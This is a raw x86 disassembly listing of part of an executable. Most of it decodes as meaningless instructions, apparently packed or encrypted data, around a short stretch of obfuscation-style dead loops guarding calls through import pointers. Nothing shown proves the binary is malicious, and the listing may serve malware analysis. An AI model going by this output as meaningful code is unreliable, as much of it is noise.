  40cd3b:	xchg   DWORD PTR [esi+0x33],edi
  40cd3e:	sub    ch,0xbe
  40cd41:	test   ebp,edi
  40cd43:	call   0x819e5b15
  40cd48:	sbb    BYTE PTR [esi],bl
  40cd4a:	loop   0x40cdbd
  40cd4c:	inc    ebx
  40cd4d:	pop    eax
  40cd4e:	dec    esp
  40cd4f:	pop    es
  40cd50:	mov    al,ds:0x4716ef50
  40cd55:	xor    DWORD PTR [ebx+0x7f19ff77],0xffffff8a
  40cd5c:	xor    edx,DWORD PTR [ebx-0x3767e079]
  40cd62:	pop    ds
  40cd63:	hlt    
  40cd64:	lea    esp,[edx+0x35]
  40cd67:	imul   edx,ecx,0x36
  40cd6a:	and    eax,0x33a8c8f6
  40cd6f:	push   esp
  40cd70:	dec    esi
  40cd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd72:	mov    bl,0x12
  40cd74:	mov    ebx,0x94869fc0
  40cd79:	cmp    DWORD PTR [edi],0xefdf5dfe
  40cd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd80:	jp     0x40cd4b
  40cd82:	mov    cl,0x29
  40cd84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd85:	retf   
  40cd86:	cmp    al,0xac
  40cd88:	daa    
  40cd89:	enter  0x460c,0x84
  40cd8d:	ret    0xd962
  40cd90:	adc    ebp,DWORD PTR [edi+0x3a]
  40cd93:	test   al,0x68
  40cd95:	fnstenv [ecx+0x342b20e4]
  40cd9b:	test   al,0xb3
  40cd9d:	nop
  40cd9e:	mov    ds:0xec8a11b8,al
  40cda3:	pop    edx
  40cda4:	or     al,BYTE PTR ds:0xe8f47570
  40cdaa:	jne    0x40cd62
  40cdac:	call   0xef6f9987
  40cdb1:	jae    0x40cdb2
  40cdb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdb4:	iret   
  40cdb5:	sbb    ebx,DWORD PTR [esi+0x176f6d73]
  40cdbb:	aaa    
  40cdbc:	into   
  40cdbd:	outs   dx,DWORD PTR ds:[esi]
  40cdbe:	and    DWORD PTR [edi],edx
  40cdc0:	xor    dh,bl
  40cdc2:	mov    bh,0xfe
  40cdc4:	push   ebx
  40cdc5:	enter  0x82c1,0xd4
  40cdc9:	pop    es
  40cdca:	mov    edi,0x3b6c33c
  40cdcf:	ret    0x6fe9
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0xe6091be],eax
  40cde3:	lahf   
  40cde4:	stos   BYTE PTR es:[edi],al
  40cde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cde6:	xor    BYTE PTR [eax+0x70],0xc9
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40ce22
  40cdee:	hlt    
  40cdef:	repnz sub DWORD PTR [eax-0x56],edx
  40cdf3:	neg    BYTE PTR [eax+0x5f922dab]
  40cdf9:	inc    esp
  40cdfa:	aad    0x49
  40cdfc:	and    al,0x67
  40cdfe:	mov    edx,0x95416ee2
  40ce03:	pop    eax
  40ce04:	jmp    0x33c6:0x43a6049b
  40ce0b:	sahf   
  40ce0c:	(bad)
  40ce0f:	mov    eax,0xa71e5ab4
  40ce14:	out    0x44,eax
  40ce16:	outs   dx,BYTE PTR ds:[esi]
  40ce17:	jns    0x40cd9e
  40ce19:	loopne 0x40cdcf
  40ce1b:	inc    edx
  40ce1c:	jle    0x40ce4b
  40ce1e:	fs retf 
  40ce20:	das    
  40ce21:	xor    BYTE PTR es:[ecx+0x2ab9ac78],0x1f
  40ce29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce2a:	xor    DWORD PTR [ecx-0x4f648dc1],esp
  40ce30:	push   ebx
  40ce31:	loop   0x40ce8d
  40ce33:	stos   BYTE PTR es:[edi],al
  40ce34:	stos   BYTE PTR es:[edi],al
  40ce35:	cmc    
  40ce36:	adc    DWORD PTR [ecx+esi*4-0x4b311b16],ebp
  40ce3d:	adc    ebp,DWORD PTR [ebx-0x4101e658]
  40ce43:	inc    edi
  40ce44:	mov    eax,0x2706241c
  40ce49:	retf   
  40ce4a:	into   
  40ce4b:	xor    ebx,0xffffffe4
  40ce4e:	adc    DWORD PTR ds:0xe299172c,ecx
  40ce54:	repz jnp 0x40ce64
  40ce57:	clc    
  40ce58:	pushf  
  40ce59:	fidivr DWORD PTR [ebx]
  40ce5b:	icebp  
  40ce5c:	jmp    0xe6c305b9
  40ce61:	imul   eax,DWORD PTR [edi-0x65],0x3d
  40ce65:	inc    ecx
  40ce66:	xchg   edi,eax
  40ce67:	add    BYTE PTR [edi],0x96
  40ce6a:	pop    edx
  40ce6b:	mov    ds:0x1da30210,eax
  40ce70:	stos   BYTE PTR es:[edi],al
  40ce71:	lods   al,BYTE PTR ds:[esi]
  40ce72:	and    DWORD PTR [ecx+0x156bc860],eax
  40ce78:	lods   eax,DWORD PTR ds:[esi]
  40ce79:	mov    edx,0xb71b4cc6
  40ce7e:	sub    BYTE PTR [edx-0x5c2212d0],cl
  40ce84:	mov    ah,0x78
  40ce86:	or     eax,0x414123cf
  40ce8b:	cmp    al,0x3e
  40ce8d:	push   cs
  40ce8e:	outs   dx,BYTE PTR ds:[esi]
  40ce8f:	xor    al,BYTE PTR [edi+0x74]
  40ce92:	scas   eax,DWORD PTR es:[edi]
  40ce93:	cmp    BYTE PTR [ebp+0x38],cl
  40ce96:	jae    0x40cee2
  40ce98:	sti    
  40ce99:	rol    BYTE PTR [eax],cl
  40ce9b:	jle    0x40ce36
  40ce9d:	cld    
  40ce9e:	retf   0xe3b8
  40cea1:	loop   0x40ce7b
  40cea3:	pop    eax
  40cea4:	sub    al,0x12
  40cea6:	push   es
  40cea7:	pop    ss
  40cea8:	pop    eax
  40cea9:	or     BYTE PTR [eax-0x71b6262d],al
  40ceaf:	push   ecx
  40ceb0:	cmp    dl,BYTE PTR [edi+eax*8-0x24]
  40ceb4:	pop    ss
  40ceb5:	lahf   
  40ceb6:	sub    DWORD PTR ds:0x2db14453,0x57
  40cebd:	cmp    eax,0xf472b043
  40cec2:	(bad)  
  40cec3:	pop    esi
  40cec4:	daa    
  40cec5:	sahf   
  40cec6:	push   ss
  40cec7:	mov    ss,WORD PTR [ecx]
  40cec9:	scas   al,BYTE PTR es:[edi]
  40ceca:	sub    ch,BYTE PTR [edi-0x2b]
  40cecd:	imul   eax,DWORD PTR [edx+0x68fd075a],0x9e247d21
  40ced7:	inc    ecx
  40ced8:	ss addr16 cwde 
  40cedb:	push   ebp
  40cedc:	push   ecx
  40cedd:	mov    WORD PTR [eax],?
  40cedf:	mov    ds:0x925e24ea,eax
  40cee4:	mov    esp,0xf6dfd803
  40cee9:	sub    eax,0x3f48c151
  40ceee:	pop    ebp
  40ceef:	mov    dh,0x13
  40cef1:	fidivr WORD PTR [ecx]
  40cef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef4:	xchg   ecx,eax
  40cef5:	add    DWORD PTR [esi],0xfee666a8
  40cefb:	(bad)  
  40cefc:	lds    eax,FWORD PTR [eax]
  40cefe:	popa   
  40ceff:	out    dx,eax
  40cf00:	ret    0x941d
  40cf03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf04:	xor    eax,0xd173ee76
  40cf09:	std    
  40cf0a:	push   eax
  40cf0b:	or     eax,0x20684944
  40cf10:	pop    edx
  40cf11:	aam    0x4b
  40cf13:	lahf   
  40cf14:	xchg   eax,ecx
  40cf16:	xor    eax,0x8a02d41a
  40cf1b:	sbb    al,0xe5
  40cf1d:	(bad)  
  40cf1e:	dec    esi
  40cf1f:	js     0x40cf61
  40cf21:	(bad)  
  40cf22:	idiv   DWORD PTR [edx+0x71f3de2]
  40cf28:	aam    0xa7
  40cf2a:	and    eax,0xd3597de4
  40cf2f:	outs   dx,BYTE PTR ds:[esi]
  40cf30:	add    bl,BYTE PTR [ebx]
  40cf32:	adc    DWORD PTR [ebx],ecx
  40cf34:	pusha  
  40cf35:	lea    esi,[ecx-0x62]
  40cf38:	mov    cl,0x3a
  40cf3a:	fstp   TBYTE PTR [edx]
  40cf3c:	les    eax,FWORD PTR [eax]
  40cf3e:	out    0x2b,eax
  40cf40:	or     BYTE PTR [ecx+0x6f821e3f],0xb7
  40cf47:	adc    al,BYTE PTR [ecx]
  40cf49:	mov    bh,0xc
  40cf4b:	jo     0x40cf9a
  40cf4d:	pop    ebp
  40cf4e:	mov    ch,0x7b
  40cf50:	icebp  
  40cf51:	sub    al,0x2b
  40cf53:	push   ebp
  40cf54:	add    edx,esi
  40cf56:	push   esi
  40cf57:	out    dx,eax
  40cf58:	popa   
  40cf59:	in     al,0xf2
  40cf5b:	ins    DWORD PTR es:[edi],dx
  40cf5c:	mov    ebp,0x1b6925b8
  40cf61:	xchg   edi,eax
  40cf62:	push   ebp
  40cf63:	xor    eax,0x4780a83d
  40cf68:	mov    esp,0xc98184ad
  40cf6d:	stc    
  40cf6e:	(bad)  
  40cf6f:	clc    
  40cf70:	test   al,0x68
  40cf72:	xchg   edx,eax
  40cf73:	shl    BYTE PTR [ebx],1
  40cf75:	aaa    
  40cf76:	call   0x8690:0x7b6c6106
  40cf7d:	jno    0x40cf7d
  40cf7f:	sub    eax,eax
  40cf81:	rcr    BYTE PTR [ebx],0x38
  40cf84:	jg     0x40cfb1
  40cf86:	or     eax,0x5e36035b
  40cf8b:	les    esp,FWORD PTR ds:0x58a51165
  40cf91:	xchg   edx,eax
  40cf92:	daa    
  40cf93:	nop
  40cf94:	ja     0x40cfdc
  40cf96:	add    eax,0xfb90a3d6
  40cf9b:	jge    0x40cf98
  40cf9d:	ins    BYTE PTR es:[edi],dx
  40cf9e:	fadd   st(7),st
  40cfa0:	sub    DWORD PTR [ebp-0x773467c6],ebp
  40cfa6:	lock push ebx
  40cfa8:	les    ecx,FWORD PTR [edi]
  40cfaa:	xor    cl,cl
  40cfac:	jmp    0xd8f8:0x6fde239f
  40cfb3:	jge    0x40cf6d
  40cfb5:	fbld   TBYTE PTR [eax-0x22feb97f]
  40cfbb:	push   ebp
  40cfbc:	retf   0x1ef4
  40cfbf:	ins    DWORD PTR es:[edi],dx
  40cfc0:	lds    esi,FWORD PTR [esi+0x11c3a744]
  40cfc6:	pop    ecx
  40cfc7:	in     al,dx
  40cfc8:	jl     0x40d02f
  40cfca:	repnz mov edi,ecx
  40cfcd:	mov    ds:0xb1b17b10,al
  40cfd2:	cmp    BYTE PTR [ebp-0x26330d79],cl
  40cfd8:	mov    dh,0x51
  40cfda:	fs int3 
  40cfdc:	dec    ebx
  40cfdd:	sbb    al,0xeb
  40cfdf:	mov    eax,0x4b6299fc
  40cfe4:	jne    0x40cfda
  40cfe6:	loop   0x40cf6c
  40cfe8:	cmp    eax,0x75b0c0a4
  40cfee:	mov    ds:0xbafe35bd,al
  40cff3:	cmp    DWORD PTR [ebp+0x630b85b8],0x20
  40cffa:	jno    0x40cfbb
  40cffc:	cli    
  40cffd:	retf   0x79ab
  40d000:	inc    eax
  40d001:	lahf   
  40d002:	cmp    DWORD PTR [ecx],ebx
  40d004:	inc    edx
  40d005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d006:	imul   ebp,DWORD PTR [eax-0x43],0xffffffd5
  40d00a:	and    al,0x98
  40d00c:	xor    ebp,DWORD PTR [edi+eax*4-0x645bd334]
  40d013:	out    dx,eax
  40d014:	pop    ecx
  40d015:	add    eax,0x6a23f9bb
  40d01a:	cmc    
  40d01b:	daa    
  40d01c:	fidiv  DWORD PTR [ecx+0x65]
  40d01f:	dec    esp
  40d020:	iret   
  40d021:	inc    edx
  40d022:	adc    cl,BYTE PTR [edx+0x69]
  40d025:	or     edx,DWORD PTR [edi]
  40d027:	mov    WORD PTR [edi-0x68a8434b],?
  40d02d:	ds das 
  40d02f:	mov    ecx,0xa9e6d61d
  40d034:	ret    0xc147
  40d037:	pop    edx
  40d038:	push   edi
  40d039:	dec    edx
  40d03a:	dec    ecx
  40d03b:	imul   edi,DWORD PTR [ecx-0x3d],0xb131117
  40d042:	mov    WORD PTR [ecx+0x41621ca3],gs
  40d048:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x43443e
  40d088:	mov    ecx,DWORD PTR ds:0x4329f2
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434416,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434416,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434416,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432cea
  40d0d1:	cmp    DWORD PTR ds:0x434416,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434416
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434416,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434416
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434416,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x4343f2,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x4343f2
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x4343f2,ecx
  40d118:	cmp    DWORD PTR ds:0x4343f2,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x4343f2,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432e46
  40d137:	call   DWORD PTR ds:0x432a6e
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432eec
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x4344b1
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x4343fe,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432e5e
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432784,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x4344a1,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43440a,0x11
  40d197:	cmp    DWORD PTR ds:0x43440a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43440a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432cee
  40d1c4:	cmp    DWORD PTR ds:0x43440a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43440a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43440a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43440a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43440a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432e56
  40d1f8:	sub    ecx,DWORD PTR ds:0x434416
  40d1fe:	mov    DWORD PTR ds:0x432e56,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x4343ee,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x4344a5,0x4343ea
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x4343f6,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434495,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x4344a1,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x4344a1
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x4344a1,ecx
  40d255:	cmp    DWORD PTR ds:0x4344a1,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x4344a1,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x432a72
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x43277c,0x13
  40d295:	cmp    DWORD PTR ds:0x43277c,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x43277c,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432da2
  40d2ba:	cmp    DWORD PTR ds:0x43277c,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x43277c
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x43277c,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x43277c
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x43277c,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x432774
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x4344a9
  40d2fa:	add    DWORD PTR ds:0x434412,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x4009624d
  40d319:	cmp    eax,0x708d7ef6
  40d31e:	jo     0x40d369
  40d320:	jge    0x40d392
  40d322:	jo     0x40d332
  40d324:	hlt    
  40d325:	stos   DWORD PTR es:[edi],eax
  40d326:	cmp    edi,ebp
  40d328:	jne    0x40d2cf
  40d32a:	faddp  st(0),st
  40d32c:	dec    ebx
  40d32d:	adc    esi,DWORD PTR [ecx-0x585d4a18]
  40d333:	pop    edx
  40d334:	fs xchg edi,eax
  40d336:	sub    BYTE PTR [ebx+0x10],ah
  40d339:	pop    ecx
  40d33a:	outs   dx,DWORD PTR ds:[esi]
  40d33b:	sub    DWORD PTR [edx+esi*2+0x191c847a],ebp
  40d342:	xor    eax,0x46e1d87
  40d347:	mov    ds:0xf0c16315,al
  40d34c:	push   esp
  40d34d:	xor    DWORD PTR [edi],edx
  40d34f:	mov    gs,ecx
  40d351:	jp     0x40d33c
  40d353:	inc    ecx
  40d354:	adc    DWORD PTR [eax+0x9],0x2c
  40d358:	adc    bh,BYTE PTR [ecx-0x72462375]
  40d35e:	(bad)  [ebp+0x26]
  40d361:	lds    ecx,FWORD PTR [eax]
  40d363:	add    DWORD PTR [edx+eax*8+0x48ef276d],ebx
  40d36a:	pushf  
  40d36b:	jmp    0x40d3a7
  40d36d:	or     ebx,DWORD PTR [ebx]
  40d36f:	push   esi
  40d370:	cmp    bl,BYTE PTR [eax+edi*4-0x12]
  40d374:	mov    ah,0xd6
  40d376:	(bad)  [eax+0x39]
  40d379:	jno    0x40d3a9
  40d37b:	and    ebx,DWORD PTR [eax+0x79]
  40d37e:	test   eax,0x7074bcda
  40d383:	test   eax,0x8286f2fa
  40d388:	hlt    
  40d389:	pushf  
  40d38a:	and    DWORD PTR [ebx-0x70],eax
  40d38d:	mov    WORD PTR [ebx+edx*8+0x7bf7aa10],fs
  40d394:	mov    esi,0xaada5cb
  40d399:	sub    cl,BYTE PTR [ebx-0x39d13764]
  40d39f:	and    DWORD PTR [ebx-0x2e2009],edi
  40d3a5:	jl     0x40d3c0
  40d3a7:	std    
  40d3a8:	xor    DWORD PTR [ecx+0xb],ecx
  40d3ab:	and    DWORD PTR [ebp+0x70],esi
  40d3ae:	repnz imul eax,esp,0x35b24e5c
  40d3b5:	mov    BYTE PTR [ecx+0x6c],bl
  40d3b8:	mov    bl,0xa1
  40d3ba:	ins    BYTE PTR es:[edi],dx
  40d3bb:	jbe    0x40d42e
  40d3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3be:	dec    ebx
  40d3bf:	lock inc DWORD PTR [esi]
  40d3c2:	mov    ?,edi
  40d3c4:	shl    ebp,1
  40d3c6:	dec    edx
  40d3c7:	xlat   BYTE PTR ds:[ebx]
  40d3c8:	lahf   
  40d3c9:	mov    cl,0x91
  40d3cb:	gs push ebx
  40d3cd:	sbb    ecx,ebx
  40d3cf:	jmp    0x40d3d4
  40d3d1:	icebp  
  40d3d2:	fcom   DWORD PTR [ebp-0x15c026aa]
  40d3d8:	xlat   BYTE PTR ds:[ebx]
  40d3d9:	mov    ds:0xb4ba1a4b,eax
  40d3de:	add    eax,0x9ff1fce3
  40d3e3:	xchg   ecx,eax
  40d3e4:	ret    
  40d3e5:	push   0xffffffc7
  40d3e7:	fwait
  40d3e8:	mov    cl,0x38
  40d3ea:	mov    esi,0x2aae0995
  40d3ef:	loopne 0x40d3f4
  40d3f1:	push   edx
  40d3f2:	xchg   BYTE PTR [ebx],ch
  40d3f4:	mov    dh,0x1
  40d3f6:	rcr    ecx,cl
  40d3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f9:	xchg   ecx,eax
  40d3fa:	das    
  40d3fb:	inc    edi
  40d3fc:	fist   DWORD PTR [ebx]
  40d3fe:	xor    DWORD PTR [eax+ebp*2],ecx
  40d401:	(bad)  
  40d402:	int    0xb1
  40d404:	dec    esi
  40d405:	pusha  
  40d406:	cld    
  40d407:	and    edx,ebp
  40d409:	jb     0x40d3eb
  40d40b:	rol    BYTE PTR [edi],1
  40d40d:	leave  
  40d40e:	pop    ss
  40d40f:	inc    ebp
  40d410:	scas   eax,DWORD PTR es:[edi]
  40d411:	push   ecx
  40d412:	jns    0x40d449
  40d414:	pusha  
  40d415:	mov    ah,0x25
  40d417:	adc    ebp,ecx
  40d419:	fld    QWORD PTR [ebx-0x7624ac9c]
  40d41f:	xor    ebp,DWORD PTR [eax-0x72]
  40d422:	push   edx
  40d423:	push   edx
  40d424:	scas   eax,DWORD PTR es:[edi]
  40d425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d426:	imul   eax,DWORD PTR [ecx-0x48],0xfffffff2
  40d42a:	arpl   ax,sp
  40d42c:	xchg   esi,eax
  40d42d:	in     eax,dx
  40d42e:	fnstsw WORD PTR [ebx-0x3efccdc5]
  40d434:	inc    ecx
  40d435:	mov    ?,WORD PTR ds:0x79a8e32e
  40d43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43c:	es call 0xbc9c5c5a
  40d442:	push   ds
  40d443:	sbb    ecx,DWORD PTR [ebx+0x77c6ac88]
  40d449:	push   edi
  40d44a:	mov    eax,ds:0xe3ecfa66
  40d44f:	pop    es
  40d450:	out    dx,al
  40d451:	scas   eax,DWORD PTR es:[edi]
  40d452:	fst    DWORD PTR [edx+esi*1]
  40d455:	push   eax
  40d456:	mov    edi,0x2f1663a6
  40d45b:	out    0xd6,al
  40d45d:	xor    al,0x30
  40d45f:	cmp    bl,BYTE PTR [ecx]
  40d461:	sub    al,0xcd
  40d463:	pusha  
  40d464:	inc    ecx
  40d465:	push   ss
  40d466:	mov    fs,WORD PTR [ebx+edi*1]
  40d469:	inc    ecx
  40d46a:	imul   ebx,ecx,0xc74e6061
  40d470:	push   ecx
  40d471:	or     eax,0xf1ca869f
  40d476:	loop   0x40d440
  40d478:	repz sub ecx,DWORD PTR [ebx+0x23]
  40d47c:	cmp    edx,DWORD PTR [esi-0x543ff691]
  40d482:	sbb    DWORD PTR [bx],edi
  40d485:	sbb    DWORD PTR [edi],0xffffffea
  40d488:	inc    esp
  40d489:	sbb    bl,BYTE PTR [ecx]
  40d48b:	(bad)  
  40d48c:	dec    ebx
  40d48d:	fwait
  40d48e:	xor    BYTE PTR [edx+0x1c],dl
  40d491:	test   BYTE PTR ds:0xe9f5d73,ch
  40d497:	push   ebp
  40d498:	out    dx,eax
  40d499:	mov    eax,0x66c21648
  40d49e:	scas   al,BYTE PTR es:[edi]
  40d49f:	pop    eax
  40d4a0:	cmp    edx,DWORD PTR [edi]
  40d4a2:	jns    0x40d4c0
  40d4a4:	nop
  40d4a5:	sti    
  40d4a6:	xchg   edx,eax
  40d4a7:	mov    ch,bl
  40d4a9:	pop    ebp
  40d4aa:	pop    eax
  40d4ab:	dec    ecx
  40d4ac:	xor    DWORD PTR cs:[esi],eax
  40d4af:	mov    edx,0xeced6c01
  40d4b4:	inc    eax
  40d4b5:	xor    bh,dl
  40d4b7:	inc    DWORD PTR [edi]
  40d4b9:	pop    esi
  40d4ba:	shr    ch,1
  40d4bc:	je     0x40d49b
  40d4be:	jl     0x40d4f3
  40d4c0:	xchg   ebp,eax
  40d4c1:	(bad)  
  40d4c2:	inc    DWORD PTR [ecx-0x73dcb110]
  40d4c8:	mov    WORD PTR [ecx],es
  40d4ca:	mov    esi,0xdfb02dca
  40d4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4d0:	add    al,0xa2
  40d4d2:	dec    ebp
  40d4d3:	sbb    al,0x16
  40d4d5:	xchg   edx,eax
  40d4d6:	cdq    
  40d4d7:	dec    ebx
  40d4d8:	inc    ecx
  40d4d9:	lds    eax,FWORD PTR [eax+0x29]
  40d4dc:	bound  ecx,QWORD PTR [eax+0x23]
  40d4df:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40d4e1:	inc    esp
  40d4e2:	or     eax,0x7330aa81
  40d4e7:	leave  
  40d4e8:	or     edx,DWORD PTR [esi+0x76]
  40d4eb:	sub    al,0xe8
  40d4ed:	in     eax,dx
  40d4ee:	mov    al,0x4b
  40d4f0:	pop    edi
  40d4f1:	sbb    eax,0xde561162
  40d4f6:	aam    0x89
  40d4f8:	add    DWORD PTR [edx+0x11],edx
  40d4fb:	test   al,0x53
  40d4fd:	(bad)  
  40d4ff:	fwait
  40d500:	inc    ebp
  40d501:	ret    
  40d502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d503:	(bad)  
  40d504:	mov    edi,0x7f1d634e
  40d509:	je     0x40d528
  40d50b:	sbb    al,0x5a
  40d50d:	or     eax,0xb6df1aef
  40d512:	call   0xf826:0x44e63343
  40d519:	scas   al,BYTE PTR es:[edi]
  40d51a:	ins    BYTE PTR es:[edi],dx
  40d51b:	stos   BYTE PTR es:[edi],al
  40d51c:	jge    0x40d4d3
  40d51e:	jg     0x40d534
  40d520:	pop    ds
  40d521:	dec    esi
  40d522:	retf   
  40d523:	pop    edx
  40d524:	inc    esp
  40d525:	pop    esp
  40d526:	inc    esp
  40d527:	popf   
  40d528:	fs (bad) 
  40d52a:	mov    ebp,0xad46dc6e
  40d52f:	jge    0x40d570
  40d531:	or     al,0x60
  40d533:	cmp    BYTE PTR [ebp+edi*4+0x448a9e02],al
  40d53a:	test   ebp,esi
  40d53c:	pop    eax
  40d53d:	jmp    0x40d5b4
  40d53f:	sub    BYTE PTR [edi],cl
  40d541:	(bad)  
  40d542:	ja     0x40d52d
  40d544:	fcmovnu st,st(1)
  40d546:	dec    ebp
  40d547:	push   eax
  40d548:	mov    ds:0x4eb46590,eax
  40d54d:	call   0x23f:0x6ae287a1
  40d554:	scas   al,BYTE PTR es:[edi]
  40d555:	sub    eax,0xf071ff66
  40d55a:	cmp    al,bh
  40d55c:	sbb    BYTE PTR [ebx],0xc
  40d55f:	out    dx,al
  40d560:	inc    esi
  40d561:	and    ch,al
  40d563:	push   esi
  40d564:	sbb    dh,BYTE PTR [edx-0x3]
  40d567:	popa   
  40d568:	xchg   esp,eax
  40d569:	jp     0x40d515
  40d56b:	mov    esi,0xc5a21fff
  40d570:	(bad)  
  40d571:	repz arpl WORD PTR es:[esi],sp
  40d575:	pop    esp
  40d576:	mov    esi,0xfe9cc9de
  40d57b:	addr16 pop ecx
  40d57d:	dec    eax
  40d57e:	sti    
  40d57f:	in     eax,0x7e
  40d581:	outs   dx,DWORD PTR ds:[esi]
  40d582:	(bad)  
  40d583:	and    al,0x9c
  40d585:	push   ebx
  40d586:	mov    ds,WORD PTR [ebx]
  40d588:	mov    edx,0x72c3622
  40d58d:	pop    ebp
  40d58e:	ins    BYTE PTR es:[edi],dx
  40d58f:	push   esp
  40d590:	loop   0x40d544
